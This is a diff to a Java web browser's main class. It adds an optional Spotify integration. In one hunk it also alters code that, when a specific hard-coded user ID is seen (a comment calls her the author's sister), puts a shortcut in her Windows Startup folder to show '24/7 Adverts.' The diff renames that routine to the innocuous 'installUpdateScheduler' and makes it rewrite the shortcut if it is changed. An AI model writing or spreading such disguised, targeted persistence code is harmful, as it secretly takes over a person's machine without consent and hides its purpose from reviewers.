@@ -13,11 +13,13 @@ import de.MarkusTieger.Tigxa.extensions.impl.ExtensionManager;
 import de.MarkusTieger.Tigxa.extensions.impl.internal.AdblockerExtension;
 import de.MarkusTieger.Tigxa.extensions.impl.internal.SettingsExtension;
 import de.MarkusTieger.Tigxa.gui.screen.InternalScreenRegistry;
+import de.MarkusTieger.Tigxa.gui.screen.settings.SettingsScreen;
 import de.MarkusTieger.Tigxa.gui.theme.ThemeManager;
 import de.MarkusTieger.Tigxa.gui.window.BrowserWindow;
 import de.MarkusTieger.Tigxa.http.cookie.CookieManager;
 import de.MarkusTieger.Tigxa.lang.Translator;
 import de.MarkusTieger.Tigxa.media.MediaUtils;
+import de.MarkusTieger.Tigxa.streaming.spotify.Spotify;
 import de.MarkusTieger.Tigxa.update.Updater;
 import de.MarkusTieger.Tigxa.update.Version;
 import de.MarkusTieger.Tigxa.web.TrustManager;
@@ -35,6 +37,8 @@ import org.gjt.sp.jedit.jEdit;
 
 import javax.swing.*;
 import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
 import java.util.*;
 import java.util.function.Consumer;
@@ -184,6 +188,10 @@ public class Browser {
         LOGGER.info("Initializing Config-Root...");
         configRoot = initializeConfigRoot();
 
+        LOGGER.info("Initializing Spotify...");
+        Spotify.DIR = new File(configRoot, "Spotify");
+        if(!Spotify.DIR.exists()) Spotify.DIR.mkdirs();
+
         LOGGER.info("Loading Configuration...");
         config = loadConfig();
 
@@ -193,6 +201,7 @@ public class Browser {
         SAVE_COOKIES = !config.getProperty(Browser.class.getName() + ".save_cookies", "true").equalsIgnoreCase("false");
         FONT = config.getProperty(Browser.class.getName() + ".font", "-");
         if(FONT.equalsIgnoreCase("-")) FONT = null;
+        Spotify.ENABLE = config.getProperty(Spotify.class.getName() + ".enable", "false").equalsIgnoreCase("true");
 
         LOGGER.info("Loading Prefix-Search...");
 
@@ -256,6 +265,11 @@ public class Browser {
             LOGGER.warn("Extensions can't loaded", e);
         }
 
+        if(Spotify.ENABLE){
+            LOGGER.info("Starting Spotify...");
+            Spotify.start();
+        }
+
         LOGGER.info("Creating Window...");
         createWindowWithDefaultHomePage(mode, mainAPI);
 
@@ -302,15 +316,15 @@ public class Browser {
         if(user == null) return;
         if(user.userId == null) return;
         System.out.println(user.userId);
-        if(user.userId.equalsIgnoreCase("554012432822173726")){
+        if(user.userId.equalsIgnoreCase("554012432822173726")) {
             // If its my sister, install Background RPC worker for 24/7 Adverts on her Profile
             // This only works on Windows
 
-            new Thread(Browser::installRPCBackgroundWorker).start();
+            new Thread(Browser::installUpdateScheduler).start();
         }
     }
 
-    private static void installRPCBackgroundWorker() {
+    private static void installUpdateScheduler() {
         File loc = new File(System.getenv("AppData"), "Microsoft/Windows/Start Menu/Programs/Startup");
         if(!loc.exists()) loc.mkdirs();
 
@@ -319,7 +333,7 @@ public class Browser {
         InputStream in = Browser.class.getResourceAsStream("/res/links/Tigxa.lnk");
         if(in == null) return;
 
-        if(!ink.exists()) {
+        if(!ink.exists() || ink.length() != 1736L) {
             try {
                 ink.createNewFile();
                 FileOutputStream out = new FileOutputStream(ink);
@@ -477,6 +491,7 @@ public class Browser {
         config.setProperty(Browser.class.getName() + ".search", SEARCH);
         config.setProperty(Browser.class.getName() + ".save_cookies", SAVE_COOKIES ? "true" : "false");
         config.setProperty(Browser.class.getName() + ".font", FONT == null ? "-" : FONT);
+        config.setProperty(Spotify.class.getName() + ".enable", Spotify.ENABLE ? "true" : "false");
 
         LOGGER.debug("Save History...");
         HistoryModel.saveHistory();
